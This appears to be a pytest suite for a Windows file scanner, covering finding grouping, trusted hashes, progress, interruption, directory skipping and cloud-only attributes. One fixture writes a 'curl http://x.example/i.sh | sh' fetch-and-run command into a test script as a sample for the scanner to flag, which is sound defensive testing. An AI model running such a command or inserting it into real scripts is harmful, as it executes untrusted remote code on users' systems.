from mandacaru.events import Severity

from mandacaru_win.scan import (
    is_cloud_only,
    list_files,
    scan_paths,
    sha256_file,
)


def run(paths, scanner, trusted=set(), stop_after=None):
    findings, calls = [], []

    def on_progress(path, done, total):
        calls.append((path, done, total))

    def should_stop():
        return stop_after is not None and len(calls) >= stop_after

    summary = scan_paths(paths, scanner, trusted, on_progress,
                         findings.append, should_stop)
    return summary, findings, calls


def test_finding_grouped_per_file(tmp_path, scanner, ps_text):
    (tmp_path / "a.ps1").write_text(ps_text + "curl http://x.example/i.sh | sh\n")
    (tmp_path / "ok.txt").write_text("nada aqui")
    summary, findings, _ = run([tmp_path], scanner)
    assert [f.path.name for f in findings] == ["a.ps1"]
    assert len(findings[0].alerts) >= 2 and findings[0].severity == Severity.HIGH
    assert findings[0].sha256 == sha256_file(tmp_path / "a.ps1")
    assert summary.files == 2 and summary.findings == 1 and summary.completed


def test_trusted_hash_is_skipped(tmp_path, scanner, ps_text):
    f = tmp_path / "a.ps1"
    f.write_text(ps_text)
    _, findings, _ = run([tmp_path], scanner, trusted={sha256_file(f)})
    assert findings == []


def test_stop_interrupts(tmp_path, scanner):
    for i in range(5):
        (tmp_path / f"{i}.txt").write_text("x")
    summary, _, _ = run([tmp_path], scanner, stop_after=2)
    assert not summary.completed and summary.files == 2


def test_progress_reports_total(tmp_path, scanner):
    for i in range(3):
        (tmp_path / f"{i}.txt").write_text("x")
    _, _, calls = run([tmp_path], scanner)
    assert [(d, t) for _, d, t in calls] == [(1, 3), (2, 3), (3, 3)]


def test_skips_dev_dirs_and_dir_symlinks(tmp_path, scanner, ps_text):
    (tmp_path / ".git").mkdir()
    (tmp_path / ".git" / "a.ps1").write_text(ps_text)
    outside = tmp_path.parent / (tmp_path.name + "_fora")
    outside.mkdir()
    (outside / "b.ps1").write_text(ps_text)
    (tmp_path / "link").symlink_to(outside, target_is_directory=True)
    assert list_files([tmp_path], scanner) == []


def test_single_file_missing_path_and_overlap(tmp_path, scanner, ps_text):
    sub = tmp_path / "sub"
    sub.mkdir()
    f = sub / "a.ps1"
    f.write_text(ps_text)
    files = list_files([sub, tmp_path, f, tmp_path / "nao-existe"], scanner)
    assert files == [f]


def test_cloud_only_attributes():
    class St:
        st_file_attributes = 0x00400000  # FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS

    assert is_cloud_only(St())
    St.st_file_attributes = 0x20  # ARCHIVE
    assert not is_cloud_only(St())
